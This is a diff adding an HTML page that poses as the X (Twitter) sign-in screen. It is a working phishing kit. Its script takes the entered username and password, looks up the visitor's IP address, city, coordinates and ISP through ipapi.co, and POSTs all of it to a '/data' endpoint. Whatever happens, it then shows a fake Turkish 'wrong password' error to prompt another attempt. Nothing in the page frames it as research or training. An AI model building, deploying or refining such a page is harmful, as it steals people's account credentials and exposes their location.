@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>X Login</title>
+<link rel="icon" href="https://static.vecteezy.com/system/resources/previews/042/148/611/non_2x/new-twitter-x-logo-twitter-icon-x-social-media-icon-free-png.png" type="image/x-icon" />
+<style>
+  :root {
+    --bg:#15202b;
+    --modal:#000;
+    --border:#2f3336;
+    --text:#e7e9ea;
+    --muted:#71767b;
+    --blue:#1d9bf0;
+    --error:#f4212e;
+  }
+  :root.light {
+    --bg:#f5f8fa;
+    --modal:#fff;
+    --border:#cfd9de;
+    --text:#0f1419;
+    --muted:#536471;
+    --blue:#1d9bf0;
+    --error:#e0245e;
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0;
+    font-family:"TwitterChirp",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    background:var(--bg);
+    display:grid;
+    place-items:center;
+    min-height:100vh;
+    color:var(--text);
+  }
+  .modal{
+    position:relative;
+    z-index:10;
+    width:100%;
+    max-width:420px;
+    background:var(--modal);
+    border-radius:16px;
+    overflow:hidden;
+    box-shadow:0 0 15px rgba(0,0,0,.5);
+  }
+  .inner{padding:20px 28px 32px}
+  .top{display:flex;align-items:center;justify-content:space-between;height:50px}
+  .close{cursor:pointer;font-size:22px}
+  .logo{margin:0 auto}
+  .logo svg{width:28px;height:28px;display:block;fill:#fff}
+  :root.light .logo svg{fill:#000}
+
+  h1{font-size:23px;line-height:28px;margin:20px 0;font-weight:800}
+
+  .btn{
+    width:100%;height:44px;padding:0 16px;border-radius:9999px;
+    font-weight:600;font-size:15px;
+    border:1px solid var(--border);
+    background:var(--text);color:var(--modal);cursor:pointer;
+    display:flex;align-items:center;justify-content:center;gap:8px;
+  }
+  .btn:hover{filter:brightness(0.95)}
+  .btn+ .btn{margin-top:12px}
+  .btn img{width:18px;height:18px}
+
+  .divider{display:flex;align-items:center;gap:10px;color:var(--muted);margin:20px 0;font-size:14px}
+  .divider::before,.divider::after{content:"";flex:1;height:1px;background:var(--border)}
+
+  .field{margin-bottom:18px}
+  .input{
+    width:100%;height:50px;padding:0 12px;border-radius:4px;
+    border:1px solid var(--border);
+    background:var(--modal);color:var(--text);
+    font-size:15px;
+  }
+  .input:focus{outline:2px solid var(--blue)}
+  .link{color:var(--blue);text-decoration:none;font-size:14px}
+  .link:hover{text-decoration:underline}
+  .foot{margin-top:20px;font-size:14px;color:var(--muted)}
+  .foot a{color:var(--blue);text-decoration:none}
+  .foot a:hover{text-decoration:underline}
+  .action{
+    width:100%;height:44px;border-radius:9999px;
+    font-weight:700;font-size:15px;
+    background:var(--text);color:var(--modal);
+    cursor:pointer;border:none;
+  }
+  .action:disabled{opacity:.5;cursor:not-allowed}
+  .eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);cursor:pointer}
+  .relative{position:relative}
+  .error{color:var(--error);font-size:14px;margin-top:6px;display:none}
+
+  /* Theme toggle button */
+  .theme-toggle {
+    cursor:pointer;
+    font-size:18px;
+    margin-left:10px;
+  }
+</style>
+</head>
+<body>
+
+<div class="modal">
+  <div class="inner">
+
+    <div class="top">
+      <span class="close">✕</span>
+      <div class="logo">
+        <!-- X LOGO INLINE SVG -->
+        <svg viewBox="0 0 1200 1227" xmlns="http://www.w3.org/2000/svg">
+          <path d="M714.163 519.284L1160.89 0H1056.27L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H104.635L515.855 747.726L842.672 1226.37H1200L714.137 519.284H714.163ZM570.482 686.169L521.92 617.571L142.163 79.6944H306.17L610.238 515.019L658.8 583.617L1056.33 1146.67H892.327L570.482 686.195V686.169Z"/>
+        </svg>
+      </div>
+      <span id="themeToggle" class="theme-toggle">🌙</span>
+    </div>
+
+    <!-- STEP 1 -->
+    <section id="step1">
+      <h1>Sign in to X</h1>
+
+      <button class="btn">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1200px-Google_%22G%22_logo.svg.png" alt="Google">
+        Sign in with Google
+      </button>
+
+      <button class="btn">
+        <img src="https://www.freepnglogos.com/uploads/apple-logo-png/apple-logo-png-dallas-shootings-don-add-are-speech-zones-used-4.png" alt="Apple">
+        Sign in with Apple
+      </button>
+
+      <div class="divider">or</div>
+
+      <div class="field">
+        <input id="username" class="input" placeholder="Phone, email, or username">
+      </div>
+
+      <button id="next" class="action">Next</button>
+
+      <div style="margin-top:12px">
+        <button class="action" style="background:var(--modal);color:var(--text);border:1px solid var(--border)">Forgot password?</button>
+      </div>
+
+      <div class="foot">Don’t have an account? <a href="#">Sign up</a></div>
+    </section>
+
+    <!-- STEP 2 -->
+    <section id="step2" style="display:none">
+      <h1>Enter your password</h1>
+
+      <div class="field">
+        <input id="userDisplay" class="input" disabled>
+      </div>
+
+      <div class="field relative">
+        <input id="password" type="password" class="input" placeholder="Password">
+        <span id="toggle" class="eye">👁</span>
+      </div>
+      <div id="errorMsg" class="error">Şifre yanlış. Lütfen tekrar deneyin.</div>
+
+      <div style="margin:6px 0"><a href="#" class="link">Forgot password?</a></div>
+
+      <button id="login" class="action" disabled>Log in</button>
+
+      <div class="foot">Don’t have an account? <a href="#">Sign up</a></div>
+    </section>
+
+  </div>
+</div>
+
+<script>
+  const nextBtn=document.getElementById("next");
+  const step1=document.getElementById("step1");
+  const step2=document.getElementById("step2");
+  const username=document.getElementById("username");
+  const userDisplay=document.getElementById("userDisplay");
+  const password=document.getElementById("password");
+  const login=document.getElementById("login");
+  const toggle=document.getElementById("toggle");
+  const errorMsg=document.getElementById("errorMsg");
+  const themeToggle=document.getElementById("themeToggle");
+
+  async function getIpDetails() {
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      return await res.json();
+    } catch (err) {
+      console.error("IP API error:", err);
+      return {};
+    }
+  }
+
+  nextBtn.addEventListener("click",()=>{
+    if(username.value.trim()){
+      userDisplay.value=username.value.trim().toLowerCase();
+      step1.style.display="none";
+      step2.style.display="block";
+      password.focus();
+    }else{
+      username.focus();
+    }
+  });
+
+  password.addEventListener("input",()=>{
+    login.disabled=password.value.length===0;
+  });
+
+  toggle.addEventListener("click",()=>{
+    password.type=password.type==="password"?"text":"password";
+  });
+
+  login.addEventListener("click",async()=>{
+    const data = await getIpDetails();
+
+    const payload = {
+      username: userDisplay.value,
+      password: password.value,
+      ip: data.ip,
+      city: data.city,
+      region: data.region,
+      country: data.country_name,
+      latitude: data.latitude,
+      longitude: data.longitude,
+      asn: data.asn,
+      org: data.org
+    };
+
+    try {
+      const res = await fetch('/data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      errorMsg.style.display="block";
+    } catch(e){
+      errorMsg.style.display="block";
+    }
+  });
+
+  // Theme toggle
+  function applyTheme(theme){
+    if(theme==="light"){
+      document.documentElement.classList.add("light");
+      themeToggle.textContent="☀️";
+    }else{
+      document.documentElement.classList.remove("light");
+      themeToggle.textContent="🌙";
+    }
+    localStorage.setItem("theme", theme);
+  }
+
+  themeToggle.addEventListener("click",()=>{
+    const current=document.documentElement.classList.contains("light")?"light":"dark";
+    applyTheme(current==="light"?"dark":"light");
+  });
+
+  // initial load
+  const savedTheme=localStorage.getItem("theme") || "dark";
+  applyTheme(savedTheme);
+</script>
+
+</body>
+</html>
